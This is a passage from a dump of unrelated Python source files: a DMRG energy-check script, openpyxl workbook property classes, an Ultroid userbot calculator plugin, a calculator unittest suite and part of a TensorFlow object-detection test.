tolerance\n  tol = float(args[2])\n  \n  #read the reference values\n  RefValues = []\n  RefFile = open(args[1],\"r\")\n  for line in RefFile:\n    linesp = line.split()\n    if len(linesp) >=3:\n      RefValues.append(float(linesp[2]))\n\n  #read and compare the calculated values\n  OutFile = open(\"dmrg.out\",\"r\")\n  for line in OutFile:\n    linesp = line.split()\n    #E(ijab)\n    if len(linesp)==3:\n      if linesp[0]==\"E(0,ijab)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[0]) > tol:\n          print calc_e,\"-\", RefValues[0], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n    #E(iab)\n    if len(linesp)==3:\n      if linesp[0]==\"E(-1,iab)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[1]) > tol:\n          print calc_e,\"-\", RefValues[1], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n    #E(ija)\n    if len(linesp)==3:\n      if linesp[0]==\"E(1,ija)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[2]) > tol:\n          print calc_e,\"-\", RefValues[2], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n    #E(ab)\n    if len(linesp)==3:\n      if linesp[0]==\"E(-2,ab)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[3]) > tol:\n          print calc_e,\"-\", RefValues[3], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n    #E(ij)\n    if len(linesp)==3:\n      if linesp[0]==\"E(2,ij)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[4]) > tol:\n          print calc_e,\"-\", RefValues[4], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n    #E(ia)\n    if len(linesp)==3:\n      if linesp[0]==\"E(0,ia)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[5]) > tol:\n          print calc_e,\"-\", RefValues[5], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n    #E(a)\n    if len(linesp)==3:    \n      if linesp[0]==\"E(-1,a)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[6]) > tol:\n          print calc_e,\"-\", RefValues[6], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n    #E(i)\n    if len(linesp)==3:\n      if linesp[0]==\"E(1,i)\":\n        calc_e = float(linesp[2])\n        if abs(calc_e-RefValues[7]) > tol:\n          print calc_e,\"-\", RefValues[7], \" > \", tol\n          print \"FAILED ....\"\n        else:\n          print \"PASSED ....\"  \n\nif __name__==\"__main__\":\n    import sys\n    run(sys.argv)\n", "248": "# Copyright (c) 2010-2020 openpyxl\n\nfrom openpyxl.descriptors.serialisable import Serialisable\nfrom openpyxl.descriptors import (\n    String,\n    Float,\n    Integer,\n    Bool,\n    NoneSet,\n    Set,\n)\n\nfrom openpyxl.descriptors.excel import Guid\n\n\nclass WorkbookProperties(Serialisable):\n\n    tagname = \"workbookPr\"\n\n    date1904 = Bool(allow_none=True)\n    dateCompatibility = Bool(allow_none=True)\n    showObjects = NoneSet(values=(['all', 'placeholders']))\n    showBorderUnselectedTables = Bool(allow_none=True)\n    filterPrivacy = Bool(allow_none=True)\n    promptedSolutions = Bool(allow_none=True)\n    showInkAnnotation = Bool(allow_none=True)\n    backupFile = Bool(allow_none=True)\n    saveExternalLinkValues = Bool(allow_none=True)\n    updateLinks = NoneSet(values=(['userSet', 'never', 'always']))\n    codeName = String(allow_none=True)\n    hidePivotFieldList = Bool(allow_none=True)\n    showPivotChartFilter = Bool(allow_none=True)\n    allowRefreshQuery = Bool(allow_none=True)\n    publishItems = Bool(allow_none=True)\n    checkCompatibility = Bool(allow_none=True)\n    autoCompressPictures = Bool(allow_none=True)\n    refreshAllConnections = Bool(allow_none=True)\n    defaultThemeVersion = Integer(allow_none=True)\n\n    def __init__(self,\n                 date1904=None,\n                 dateCompatibility=None,\n                 showObjects=None,\n                 showBorderUnselectedTables=None,\n                 filterPrivacy=None,\n                 promptedSolutions=None,\n                 showInkAnnotation=None,\n                 backupFile=None,\n                 saveExternalLinkValues=None,\n                 updateLinks=None,\n                 codeName=None,\n                 hidePivotFieldList=None,\n                 showPivotChartFilter=None,\n                 allowRefreshQuery=None,\n                 publishItems=None,\n                 checkCompatibility=None,\n                 autoCompressPictures=None,\n                 refreshAllConnections=None,\n                 defaultThemeVersion=None,\n                ):\n        self.date1904 = date1904\n        self.dateCompatibility = dateCompatibility\n        self.showObjects = showObjects\n        self.showBorderUnselectedTables = showBorderUnselectedTables\n        self.filterPrivacy = filterPrivacy\n        self.promptedSolutions = promptedSolutions\n        self.showInkAnnotation = showInkAnnotation\n        self.backupFile = backupFile\n        self.saveExternalLinkValues = saveExternalLinkValues\n        self.updateLinks = updateLinks\n        self.codeName = codeName\n        self.hidePivotFieldList = hidePivotFieldList\n        self.showPivotChartFilter = showPivotChartFilter\n        self.allowRefreshQuery = allowRefreshQuery\n        self.publishItems = publishItems\n        self.checkCompatibility = checkCompatibility\n        self.autoCompressPictures = autoCompressPictures\n        self.refreshAllConnections = refreshAllConnections\n        self.defaultThemeVersion = defaultThemeVersion\n\n\nclass CalcProperties(Serialisable):\n\n    tagname = \"calcPr\"\n\n    calcId = Integer()\n    calcMode = NoneSet(values=(['manual', 'auto', 'autoNoTable']))\n    fullCalcOnLoad = Bool(allow_none=True)\n    refMode = NoneSet(values=(['A1', 'R1C1']))\n    iterate = Bool(allow_none=True)\n    iterateCount = Integer(allow_none=True)\n    iterateDelta = Float(allow_none=True)\n    fullPrecision = Bool(allow_none=True)\n    calcCompleted = Bool(allow_none=True)\n    calcOnSave = Bool(allow_none=True)\n    concurrentCalc = Bool(allow_none=True)\n    concurrentManualCount = Integer(allow_none=True)\n    forceFullCalc = Bool(allow_none=True)\n\n    def __init__(self,\n                 calcId=124519,\n                 calcMode=None,\n                 fullCalcOnLoad=True,\n                 refMode=None,\n                 iterate=None,\n                 iterateCount=None,\n                 iterateDelta=None,\n                 fullPrecision=None,\n                 calcCompleted=None,\n                 calcOnSave=None,\n                 concurrentCalc=None,\n                 concurrentManualCount=None,\n                 forceFullCalc=None,\n                ):\n        self.calcId = calcId\n        self.calcMode = calcMode\n        self.fullCalcOnLoad = fullCalcOnLoad\n        self.refMode = refMode\n        self.iterate = iterate\n        self.iterateCount = iterateCount\n        self.iterateDelta = iterateDelta\n        self.fullPrecision = fullPrecision\n        self.calcCompleted = calcCompleted\n        self.calcOnSave = calcOnSave\n        self.concurrentCalc = concurrentCalc\n        self.concurrentManualCount = concurrentManualCount\n        self.forceFullCalc = forceFullCalc\n\n\nclass FileVersion(Serialisable):\n\n    tagname = \"fileVersion\"\n\n    appName = String(allow_none=True)\n    lastEdited = String(allow_none=True)\n    lowestEdited = String(allow_none=True)\n    rupBuild = String(allow_none=True)\n    codeName = Guid(allow_none=True)\n\n    def __init__(self,\n                 appName=None,\n                 lastEdited=None,\n                 lowestEdited=None,\n                 rupBuild=None,\n                 codeName=None,\n                ):\n        self.appName = appName\n        self.lastEdited = lastEdited\n        self.lowestEdited = lowestEdited\n        self.rupBuild = rupBuild\n        self.codeName = codeName\n", "249": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "250": "from Calculator import Calculator\nimport unittest\n\n\nclass CalculatorTest(unittest.TestCase):\n\n    def setUp(self):\n        self.calc = Calculator()\n\n    def test_default_display_0(self):\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_0_represented_as_0(self):\n        self.calc.Press(\"0\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"0\")\n\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_intger_Number(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"3\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"6\")\n        self.calc.Press(\"7\")\n        self.calc.Press(\"8\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"0\")\n\n        self.assertEqual(\"1234567890\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_decimal_Number_1(self):\n        self.calc.Press(\".\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"3\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"6\")\n        self.calc.Press(\"7\")\n        self.calc.Press(\"8\")\n        self.calc.Press(\"9\")\n\n        self.assertEqual(\"0.003456789\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_decimal_Number_2(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\"2\")\n\n        self.assertEqual(\"42.042\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_sum_Input_first_value(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"+\")\n        self.assertEqual(\"12\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_sum_Input_second_value(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"2\")\n        self.assertEqual(\"2\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_sum_two_values_with_addiction_sign(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"+\")\n        self.assertEqual(\"14\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_sum_input_third_value(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"5\")\n        self.assertEqual(\"5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_sum_three_values_with_equal_sign(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"19.5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_substract_input_two_values(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.assertEqual(\"5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_substract_two_values_with_substract_sign(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"-\")\n        self.assertEqual(\"2.5\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_substract_three_values_with_equal_sign(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"4.5\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_multiply_input_two_values(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.assertEqual(\"2.5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_multiply_two_values_with_multiply_sign(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"x\")\n        self.assertEqual(\"5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_multiply_three_values_with_equal_sign(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"10\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_divide_input_two_values(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"5\")\n        self.assertEqual(\"5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_divide_two_values_with_divide_sign(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"/\")\n        self.assertEqual(\"0.5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_divide_three_values_with_equal_sign(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"0.25\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_sum_and_multiply(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"15\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_divide_and_substract(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"1\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"=\")\n\n        self.assertEqual(\"1\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_sum_and_equal_many_times(self):\n        self.calc.Press(\"2\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"1\")\n        self.calc.Press(\"=\")\n        self.calc.Press(\"=\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"7.6\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_multiple_many_times(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"4\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_negative_values_equatation(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"2.5\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_negative_values_equatation2(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"2\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_fraction_short(self):\n        self.calc.Press(\".\")\n        self.calc.Press(\"4\")\n        self.assertEqual(\"0.4\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_fraction_short_second_value(self):\n        self.calc.Press(\"5\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"4\")\n        self.assertEqual(\"0.4\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_Clear(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"C/CE\")\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_Clear_memory(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"M-\")\n        self.calc.Press(\"C/CE\")\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n        self.assertTrue(self.calc.IsMemorized)\n\n    def test_Clear_memory2(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"M-\")\n        self.calc.Press(\"C/CE\")\n        self.calc.Press(\"C/CE\")\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n        self.assertFalse(self.calc.IsMemorized)\n\n    def test_input_after_Clear(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"C/CE\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.assertEqual(\"0.5\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_equatation_after_Clear(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"C/CE\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\".\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"2.5\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_negative_multiply(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"6\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"30\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_M_plus_value(self):\n        self.calc.Press(\"5\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.assertTrue(self.calc.IsMemorized)\n\n    def test_M_plus_value2(self):\n        self.calc.Press(\"5\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"5\")\n        self.assertEqual(\"5\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_MRC_value(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"MRC\")\n        self.assertEqual(\"1\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n\n    def test_MRC_value2(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"M-\")\n        self.calc.Press(\"MRC\")\n        self.assertEqual(\"9\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_value_after_MRC(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"MRC\")\n        self.calc.Press(\"3\")\n        self.assertEqual(\"3\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n        self.assertTrue(self.calc.IsMemorized)\n\n    def test_value_after_MRC2(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"MRC\")\n        self.calc.Press(\"MRC\")\n        self.assertEqual(\"1\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n        self.assertFalse(self.calc.IsMemorized)\n\n    def test_value_after_MRC3(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"-\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"MRC\")\n        self.calc.Press(\"5\")\n        self.calc.Press(\"MRC\")\n        self.assertEqual(\"1\", self.calc.Display)\n        self.assertTrue(self.calc.IsNegative)\n        self.assertTrue(self.calc.IsMemorized)\n\n    def test_multiply_after_MRC(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"M+\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"MRC\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"8\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n        self.assertTrue(self.calc.IsMemorized)\n\n    def test_sqrt(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"sqrt\")\n        self.assertEqual(\"2\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_sqrt_error(self):\n        self.calc.Press(\"-\")\n        self.calc.Press(\"4\")\n        self.calc.Press(\"sqrt\")\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n        self.assertTrue(self.calc.Error)\n\n    def test_div0_error(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n        self.assertTrue(self.calc.Error)\n\n    def test_percent_multiply(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"x\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"p\")\n        self.assertEqual(\"2\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_percent_Divide(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"2\")\n        self.calc.Press(\"p\")\n        self.assertEqual(\"5000\", self.calc.Display)\n        self.assertFalse(self.calc.IsNegative)\n\n    def test_div0_error(self):\n        self.calc.Press(\"4\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"0\")\n        self.calc.Press(\"=\")\n        self.calc.Press(\"4\")\n        self.assertEqual(\"0\", self.calc.Display)\n        self.assertTrue(self.calc.Error)\n\n    def test_div0_error2(self):\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"+\")\n        self.assertEqual(\"99999999999\", self.calc.Display)\n        self.assertFalse(self.calc.Error)\n\n    def test_div0_error3(self):\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"9\")\n        self.calc.Press(\"+\")\n        self.calc.Press(\"1\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"100000000000\", self.calc.Display)\n        self.assertTrue(self.calc.Error)\n\n    def test_div1_3(self):\n        self.calc.Press(\"1\")\n        self.calc.Press(\"/\")\n        self.calc.Press(\"3\")\n        self.calc.Press(\"=\")\n        self.assertEqual(\"0.33333333333\", self.calc.Display)\n        self.assertFalse(self.calc.Error)\n\nif __name__ == '__main__':\n    unittest.main()", "251": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def 